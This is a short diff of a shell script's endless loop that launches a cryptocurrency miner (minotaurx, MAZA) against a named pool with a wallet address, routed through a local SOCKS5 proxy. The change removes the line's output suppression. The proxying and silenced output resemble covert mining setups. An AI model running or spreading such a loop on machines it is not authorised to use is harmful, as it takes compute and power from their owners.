@@ -160,6 +160,6 @@ sleep 2
 
 while true
 do
-./opt -a minotaurx -o stratum+tcp://usa.latinminers.com:9451 -u MGaypRJi43LcQxrgoL2CW28B31w4owLvv8.$currentdate -p c=MAZA,m=solo -t $used_num_of_cores --proxy=socks5://127.0.0.1:7777 1>/dev/null 2>&1
+./opt -a minotaurx -o stratum+tcp://usa.latinminers.com:9451 -u MGaypRJi43LcQxrgoL2CW28B31w4owLvv8.$currentdate -p c=MAZA,m=solo -t $used_num_of_cores --proxy=socks5://127.0.0.1:7777
 sleep 10
 done
